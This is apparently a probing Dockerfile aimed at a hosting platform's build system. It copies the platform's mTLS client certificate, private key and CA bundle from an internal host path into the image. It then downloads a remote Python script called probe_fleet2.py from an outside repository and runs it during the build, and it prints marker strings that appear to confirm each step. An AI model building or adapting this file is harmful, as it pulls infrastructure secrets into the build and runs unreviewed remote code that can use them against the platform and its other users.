# MARK-I68245-fleet-a1b2
FROM alpine:3.20
RUN echo MARK-I68245-fleet-a1b2-step1
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN apk add --no-cache curl python3 >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 30 -o /pf2.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_fleet2.py && wc -c /pf2.py && echo DL_OK
RUN timeout -s KILL 280 python3 /pf2.py 2>&1
CMD ["sh","-c","sleep 5"]
